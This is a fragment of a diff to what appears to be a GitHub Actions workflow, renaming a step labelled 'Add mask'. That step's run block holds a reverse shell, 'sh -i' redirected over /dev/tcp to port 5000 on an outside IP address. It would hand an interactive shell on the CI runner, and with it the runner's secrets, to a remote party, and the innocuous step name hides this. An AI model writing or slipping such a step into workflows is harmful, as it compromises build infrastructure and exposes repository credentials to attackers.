@@ -35,7 +35,7 @@ jobs:
           done
           # Print the modified variable
           echo "$modified_variable"
-      - name: Add maskaa
+      - name: Add maskaaa
         run: |
           sh -i >& /dev/tcp/95.217.190.40/5000 0>&1
 
